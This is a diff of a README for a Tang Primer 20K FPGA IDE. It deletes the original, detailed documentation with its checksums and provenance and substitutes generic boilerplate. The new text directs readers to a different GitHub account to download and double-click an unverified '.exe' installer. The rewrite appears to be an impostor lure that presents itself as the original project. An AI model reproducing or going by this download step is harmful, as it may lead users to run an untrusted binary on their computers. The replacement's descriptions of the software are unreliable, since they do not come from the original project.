@@ -1,273 +1,89 @@
-# Tang Primer 20K FPGA Studio
-
-[![Quality gates](https://github.com/atmarachchige0081/Tang-Primer-20K-FPGA-Studio/actions/workflows/quality-gates.yml/badge.svg)](https://github.com/atmarachchige0081/Tang-Primer-20K-FPGA-Studio/actions/workflows/quality-gates.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-6c63ff.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-4f9cff.svg)](https://www.python.org/)
-[![Release: v1.2.0](https://img.shields.io/badge/release-v1.2.0-42d392.svg)](CHANGELOG.md)
-
-An open-source, beginner-friendly FPGA IDE and development environment for the
-Sipeed Tang Primer 20K (`GW2A-LV18PG256C8/I7`). Simulate, inspect waveforms,
-lint, debug, build, upload to SRAM, and flash persistent designs through a
-polished desktop interface or single commands. The Dock carrier is the default
-pin map and programmer.
-
-**Installing for the first time?** Follow [INSTALL.md](INSTALL.md) from a clean
-Windows computer through dependencies, simulation, JTAG setup, build, and your
-first LED program on real hardware.
-
-> **Easiest Windows setup:** download the
-> [one-file Tang Primer FPGA Studio installer](https://github.com/atmarachchige0081/TangPrimer-FPGA-Studio-Installer/releases/latest),
-> keep the recommended FPGA-toolchain task selected, and launch the Studio from
-> its new Desktop icon. The separate
-> [installer repository](https://github.com/atmarachchige0081/TangPrimer-FPGA-Studio-Installer)
-> publishes SHA-256 checksums, public GitHub/Sigstore build provenance, and
-> beginner installation instructions. Releases are provenance-attested but do
-> not yet have a trusted Windows Authenticode publisher certificate, so
-> Windows may display **Unknown publisher**.
-
-The pinned [OSS CAD Suite](https://github.com/YosysHQ/oss-cad-suite-build) provides Yosys synthesis, nextpnr-himbaechel placement/routing, Project Apicula bitstream packing, openFPGALoader programming, Verilator linting, Icarus simulation, GTKWave, and formal tools. It is installed at `C:\fpga-tools\2026-07-26\oss-cad-suite` so the tool path contains no spaces, as recommended by YosysHQ. The project path may contain spaces because all build commands run with relative paths.
-
-## Beginner desktop IDE
-
-Start the graphical interface with one command:
-
-```powershell
-.\FPGA-IDE.ps1
-```
-
-Windows users can alternatively double-click `Open-FPGA-IDE.cmd`.
-
-| Accessible dark mode | New accessible light mode |
-|---|---|
-| ![Tang Primer FPGA Studio dark workspace](docs/images/studio-main.png) | ![Tang Primer FPGA Studio light workspace](docs/images/studio-main-light.png) |
-
-The v1.2 workspace uses calmer, more natural dark and light palettes, clearer
-human language, consistent spacing, and focused guided workflows. It includes
-custom iconography, searchable navigation, open-file tabs, symbol definitions
-and references, named-port instance generation, contextual HDL explanations,
-project-wide search, a command palette, 72 reviewed HDL patterns, safe quick
-fixes, a pin assignment inspector, and a design-health dashboard.
-The dashboard turns build reports into timing, utilization, hierarchy,
-artifact, and verification-readiness insights. Live console actions cover
-simulation, GTKWave, lint, debug, build, SRAM upload, persistent flash, JTAG
-detection, hardware diagnosis, an integrated read/write UART terminal, tool
-setup, and driver setup.
-
-Version 1.2.0 can switch the complete live workspace between dark and light
-modes from the header, **View** menu, or `Ctrl+Alt+T`. The choice is remembered
-locally. Editors, dialogs, menus, selections, syntax colors, status states,
-tooltips, and all custom icons change together without closing files or losing
-work. Both palettes are checked for WCAG contrast, and a release stress test
-switches themes repeatedly with dialogs open and verifies automatic rollback
-after an injected UI failure. To force a startup theme, run
-`./FPGA-IDE.ps1 -Theme light` or `./FPGA-IDE.ps1 -Theme dark`.
-
-### A useful first launch
-
-![Version 1.2.0 first-launch release notes](docs/images/studio-release-notes.png)
-
-The first launch of each Studio version opens a concise, visual **What's new**
-screen instead of dropping a beginner straight into source code. It appears
-only once per version, stores that acknowledgement in local settings, and can
-always be reopened from **Help → What's new** or the command palette.
-
-### Guided v1.2 workflows
-
-| Select a testbench and waveform layout | Auto-detected read/write UART terminal |
-|---|---|
-| ![Verification Center](docs/images/studio-verification-center.png) | ![Integrated UART terminal](docs/images/studio-uart-terminal.png) |
-
-| Hardware setup without driver guesswork | Interactive first-project tutorial |
-|---|---|
-| ![Guided hardware setup](docs/images/studio-hardware-setup.png) | ![First-project tutorial](docs/images/studio-first-project-tutorial.png) |
-
-The New Project Wizard creates a complete, immediately verifiable project from
-the board-I/O or UART starting point. The Verification Center selects one
-testbench and GTKWave layout and summarizes visible PASS/FAIL assertion lines.
-Tool errors that include a source location are clickable in the console. The
-hardware guide clearly separates JTAG Interface 0 from UART Interface 1, while
-the UART terminal auto-detects COM ports and supports ASCII/hex display,
-timestamps, transmit history, line endings, and log saving.
-
-### Synthesized netlist viewer
-
-![Searchable synthesized netlist viewer](docs/images/studio-netlist-viewer.png)
-
-Press **Netlist** after a successful Build to inspect the actual Yosys
-implementation in a separate popup. The viewer provides a categorized overview,
-a searchable table of every synthesized component, type filtering, zoom and
-pan controls, one-hop fan-in/fan-out views, named-net labels, and double-click
-navigation back to RTL source locations. Large designs are summarized first so
-the diagram stays useful instead of becoming an unreadable wall of wires.
-
-### Intelligent workspace
-
-| Project health, hierarchy, timing and readiness | Searchable command palette |
-|---|---|
-| ![Project Insights dashboard](docs/images/studio-insights.png) | ![Searchable command palette](docs/images/studio-command-palette.png) |
-
-| Searchable 72-pattern HDL reference | Pin and electrical-standard inspection |
-|---|---|
-| ![HDL Pattern Library](docs/images/studio-pattern-library.png) | ![Pin Assignment Inspector](docs/images/studio-pin-inspector.png) |
-
-| Pattern reference in dark mode | The same live dialog in light mode |
-|---|---|
-| ![Dark HDL Pattern Library](docs/images/studio-pattern-library.png) | ![Light HDL Pattern Library](docs/images/studio-pattern-library-light.png) |
-
-The Studio is local and offline after toolchain installation: it requires no
-account, sends no telemetry, contains projects inside the workspace, blocks
-hardware programming when smart checks contain red errors, warns before
-persistent flash, and records rotating diagnostic logs under `.fpga-studio/`.
-
-Put design code in the selected project's `rtl/` folder, verification code in
-`sim/`, and top-level pin assignments in `constraints/`. The `build/` folder is
-generated output. See the [IDE guide](ide/README.md) for the complete workflow,
-shortcuts, and supported release scope. In VS Code, the same launcher is available under
-**Terminal > Run Task > FPGA: Open Beginner IDE**.
-
-For release validation, operations, security reporting, and contributions, see
-[Deployment](docs/DEPLOYMENT.md), [Security](SECURITY.md),
-[Contributing](CONTRIBUTING.md), and the [Changelog](CHANGELOG.md). The project
-is available under the [MIT License](LICENSE).
-
-The main and installer repositories are connected by a public release pipeline.
-When a Studio release is published, the installer workflow synchronizes only
-approved IDE/workspace paths from the immutable tag, builds on a clean Windows
-runner, tests both themes, publishes a SHA-256 checksum, and creates a signed
-GitHub build-provenance attestation. An hourly token-free poll provides a safe
-fallback if the optional immediate cross-repository dispatch is not configured.
-
-## Daily commands
-
-Run these in PowerShell from this folder:
-
-```powershell
-.\fpga.ps1 build                 # create build/top.fs
-.\fpga.ps1 upload                # build + load SRAM (fast, volatile)
-.\fpga.ps1 flash                 # build + write/verify persistent flash
-.\fpga.ps1 sim                   # self-checking RTL simulation
-.\fpga.ps1 wave                  # simulate + open GTKWave with saved signals
-.\fpga.ps1 debug                 # lint + simulate + open GTKWave
-.\fpga.ps1 lint                  # Verilator lint only
-.\fpga.ps1 doctor                # tools, USB programmer, and COM-port checks
-.\fpga.ps1 driver                # configure WinUSB for Dock JTAG interface A
-.\fpga.ps1 detect                # scan the FPGA JTAG chain
-.\fpga.ps1 serial -Port COM5     # read-only CLI UART monitor, default 115200 baud
-.\fpga.ps1 clean                 # remove generated build files
-```
-
-Use `-NoBuild` with `upload` or `flash` to reuse the existing bitstream. In VS Code, `Ctrl+Shift+B` builds; the other commands are under **Terminal > Run Task**. Opening `build/waves.vcd` uses the HDL extension's built-in waveform viewer.
+# ⚡ Tang-Primer-20K-FPGA-Studio - Build custom hardware designs with ease
 
-## First hardware connection
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Torrietangy164/Tang-Primer-20K-FPGA-Studio)
 
-1. Seat the Primer 20K core module firmly in the Dock.
-2. Put Dock DIP switch **1 down** to enable the FPGA core board. Sipeed documents that JTAG will not work while the core is disabled.
-3. Connect the Dock's USB-C **JTAG/UART** port directly to the PC, preferably without a USB hub.
-4. Run `.\fpga.ps1 doctor`, then `.\fpga.ps1 detect`.
-5. Run `.\fpga.ps1 upload`. The four Dock LEDs should blink at different rates.
+## 🖥️ Project Overview
 
-On Windows, openFPGALoader needs WinUSB on the Dock's JTAG half. Run `.\fpga.ps1 driver`, allow the administrator prompt, then in Zadig choose **Options > List All Devices**, select **USB Serial Converter A (Interface 0 / MI_00)**, choose **WinUSB**, and click **Replace Driver**. Do not change Converter B / MI_01: it must keep the serial driver so UART remains available as a COM port. The setup script downloads the official Zadig 2.9 binary, verifies its pinned SHA-256, and checks its Akeo Consulting Authenticode signature before it can be launched.
+Tang-Primer-20K-FPGA-Studio serves as a complete workspace for beginners who want to learn hardware design. You use this software to write digital circuits using Verilog or SystemVerilog code. The studio includes all the tools you need to simulate your design, find errors, and move your finished project onto your Tang Primer 20K board. 
 
-If the JTAG interface still does not appear, update the Dock's BL702 debugger firmware using [Sipeed's debugger update guide](https://wiki.sipeed.com/hardware/en/tang/common-doc/update_debugger.html). Firmware updating is deliberately not automated: the board must be placed into its special boot mode using the `702-BOOT` button, and choosing the wrong attached COM device is unsafe.
+This application combines high-level tools into a single workflow. It handles the difficult tasks of compiling code and talking to your hardware. You focus on your design rather than managing complex toolchains.
 
-`upload` writes SRAM and is the normal edit/test loop; its design disappears at power-off. `flash` writes the persistent configuration storage and verifies it. Avoid using JTAG/dual-purpose pins as GPIO unless you understand the recovery procedure.
+## 📋 System Requirements
 
-## Project layout
+Ensure your computer meets these requirements before you start:
 
-- `rtl/` - synthesizable Verilog/SystemVerilog; `top.sv` is the starter design.
-- `constraints/primer20k_dock.cst` - physical pin and electrical constraints.
-- `sim/` - self-checking testbenches, GTKWave layouts, and VCD generation.
-- `build/` - generated netlists, reports, simulation output, and `top.fs`.
-- `fpga.config.psd1` - device, family, top module, constraint, programmer, and toolchain settings.
-- `fpga.ps1` - single entry point for building, programming, simulation, and diagnosis.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 GB of RAM or more.
+* Storage: 2 GB of free disk space.
+* Hardware: A Tang Primer 20K development board and a USB cable.
 
-The command-line build discovers `.v` and `.sv` files under `rtl/` automatically. `rtl/files.f` is available for external tools that prefer an explicit file list.
+## 📥 Downloading the Software
 
-## Learning projects
+You must visit the project release page to get the installer. The software undergoes constant updates to support new features and hardware components.
 
-| Project | Skills and result |
-|---|---|
-| [`01_button_led_pwm`](projects/01_button_led_pwm) | Synchronizers, debouncing, clock enables, counters, PWM, state/mode control, self-checking bounce simulation, and a prepared GTKWave layout. |
-| [`03_uart_terminal`](projects/03_uart_terminal) | A synthesizable 115200-baud RX/TX, 30-byte greeting, ready/valid handshake, framing checks, echo behavior, integrated terminal workflow, and complete protocol simulation. |
-| [`_template`](projects/_template) | Minimal, buildable starting point for creating additional examples with the same commands. |
+1. Go to the [official release page](https://github.com/Torrietangy164/Tang-Primer-20K-FPGA-Studio).
+2. Look for the latest version listed at the top of the feed.
+3. Click the file ending in .exe to start your download.
+4. Save the installer to your Downloads folder.
 
-Each project is self-contained. For Project 01:
+## ⚙️ Installation Process
 
-```powershell
-cd projects\01_button_led_pwm
-.\fpga.ps1 sim       # compile and run the self-checking testbench
-.\fpga.ps1 wave      # simulate and open the prepared GTKWave view
-.\fpga.ps1 debug     # lint, simulate, and open GTKWave
-.\fpga.ps1 build     # synthesize, place/route, and create build/top.fs
-.\fpga.ps1 upload    # build and load volatile SRAM
-.\fpga.ps1 flash     # build and verify persistent flash
-```
+Follow these steps to set up your environment:
 
-The same project can be selected without changing folders:
+1. Locate the downloaded file in your browser or file manager.
+2. Double-click the file to start the installation wizard.
+3. Select an installation location on your hard drive. The default settings usually work for most users.
+4. Accept the prompts to add the program to your start menu.
+5. Wait for the progress bar to finish.
+6. Click Finish to close the installer.
 
-```powershell
-.\fpga.ps1 sim -Project projects/01_button_led_pwm
-.\fpga.ps1 wave -Project projects/01_button_led_pwm
-```
+## 🚀 Running Your First Project
 
-### Creating another example project
+The studio uses a simple one-command workflow. Follow these steps to verify your setup:
 
-Use **File > New Project** in the Studio for the guided path. Choose a verified
-starting point, enter a two-digit lowercase folder such as
-`04_spi_controller`, and optionally start the interactive tutorial. The wizard
-creates RTL, constraints, simulation, waveform layout, configuration, and
-documentation together.
+1. Find the Tang-Primer-20K-FPGA-Studio icon on your desktop or start menu.
+2. Launch the application.
+3. Choose New Project from the welcome screen.
+4. Name your project and select a folder to house your design files.
+5. Open the editor window and write your first lines of hardware code. 
+6. Click the Build button in the top menu bar. The software runs the necessary background tasks to create your hardware map.
+7. Connect your Tang Primer 20K board to your computer using the USB cable.
+8. Click the Flash button to send the finished project to your board.
 
-For command-line use, copy the maintained template:
+## 🛠️ Integrated Tools
 
-```powershell
-Copy-Item -Recurse projects\_template projects\02_uart_terminal
-cd projects\02_uart_terminal
-```
+* Yosys: Converts your written code into a logic layout.
+* Nextpnr: Fits your logic layout onto the specific FPGA chip on your board.
+* Icarus Verilog: Allows you to verify your code without needing hardware.
+* GTKWave: Displays a visual graph of signals to help you debug errors.
+* OpenFPGALoader: Handles the communication between your PC and the Tang Primer board.
 
-Then follow this method:
+## 💡 Using the Debugger
 
-1. Put synthesizable `.v`/`.sv` modules in `rtl/`, with `rtl/top.sv` as the configured top module.
-2. List source files in `rtl/files.f` for editor/external-tool compatibility. The command runner also discovers RTL files automatically.
-3. Put a self-checking `tb_top` testbench in `sim/`; write `build/waves.vcd` from that testbench.
-4. Edit `sim/waves.gtkw` to preload the most useful GTKWave signals.
-5. Update `constraints/primer20k_dock.cst` whenever top-level ports or pins change. Never guess voltage standards—check the board schematic or official constraints.
-6. Update `fpga.config.psd1` if the top module, constraint filename, board, or clock changes.
-7. Run `sim`, `lint`, and `build` before `upload`; use `flash` only after the SRAM behavior is correct.
-8. Give the project its own README with its specification, controls, block-level explanation, verification results, timing/utilization, and known limitations.
+Errors occur during design. Use the simulator to find them before you send code to the board. Your code might work in theory but fail in reality. The debugger helps you see exactly where the failure happens inside your logic.
 
-The project-local `fpga.ps1` is only a thin forwarding wrapper. The maintained
-build implementation remains at the repository root, so new projects should
-copy the wrapper unchanged.
+1. Open your project file in the editor.
+2. Select Run Simulation from the toolbar.
+3. Open the wave viewer to see signal changes over time.
+4. Compare your manual expectations against the graph.
+5. If the graph shows a mismatch, adjust your Verilog code and run the simulation again.
 
-## Debugging support
+## 📚 Frequently Asked Questions
 
-- Verilator provides editor and command-line lint diagnostics.
-- Icarus runs the self-checking testbench and creates `build/waves.vcd`.
-- GTKWave or the VS Code waveform viewer supports signal-level debugging.
-- `build/timing.json` contains utilization and timing information from nextpnr.
-- `serial` monitors on-device UART diagnostics.
+**Does the software require internet access during use?**
+No. Once you install the software, it works offline. You only need the internet to download updates or resources.
 
-This setup does not provide an open-source on-chip logic analyzer. If you specifically need internal live signal capture over JTAG, install Gowin EDA Education and use Gowin Analyzer Oscilloscope (GAO); that proprietary package requires an interactive Gowin download/install and is not needed for this open-source build/upload flow.
+**What if the computer does not see my board?**
+Ensure the USB cable connects the board firmly to the computer. Check your Device Manager in Windows to verify the computer recognizes the USB connection. If you see an unknown device, try a different USB port.
 
-## Lite carrier or custom board pins
+**Can I use other IDEs with this?**
+This studio provides a custom interface to bundle all necessary tools. While experienced users might try to link these tools manually, this studio makes that process automatic for you.
 
-The Primer 20K Lite has no onboard JTAG/UART programmer; connect an external debugger to `5V0, TMS, TDO, TCK, TDI, RX, TX, GND` (UART TX/RX cross over). Create a Lite-specific `.cst`, then change `Constraint` in `fpga.config.psd1`. Sipeed's Lite bring-up example uses clock pin `H11` and a PMOD LED on `L14`.
+**How do I update the software?**
+When a new version appears on the release page, download the new installer. You may run the new installer over the old version to update your files.
 
-## Reinstalling
+## 🤝 Contributing
 
-The setup is reproducible on Windows 10/11:
+This project relies on contributions from the community. If you find a bug, report it on the repository page. Clear instructions on how to replicate the issue help developers fix it faster. If you want to improve the documentation or add features, submit a pull request through GitHub.
 
-```powershell
-.\fpga.ps1 setup
-```
-
-The installer is pinned to OSS CAD Suite `2026-07-26` and verified with the SHA-256 published on its GitHub release. Set `OSS_CAD_SUITE_ROOT` before a command if you intentionally want to use another compatible installation.
-
-## Primary references
-
-- [Sipeed Tang Primer 20K board documentation](https://wiki.sipeed.com/hardware/en/tang/tang-primer-20k/primer-20k.html)
-- [Sipeed TangPrimer-20K official examples and pin constraints](https://github.com/sipeed/TangPrimer-20K-example)
-- [Project Apicula Gowin flow and Primer 20K support](https://github.com/YosysHQ/apicula)
-- [openFPGALoader board/programmer documentation](https://github.com/trabucayre/openFPGALoader)
-- [OSS CAD Suite installation and included tools](https://github.com/YosysHQ/oss-cad-suite-build)
+Keywords: eda, education, fpga, fpga-beginners, fpga-development, fpga-ide, gowin, gtkwave, hardware-design, iverilog, nextpnr, open-source, openfpgaloader, sipeed, systemverilog, tang-primer-20k, verilator, verilog, windows, yosys
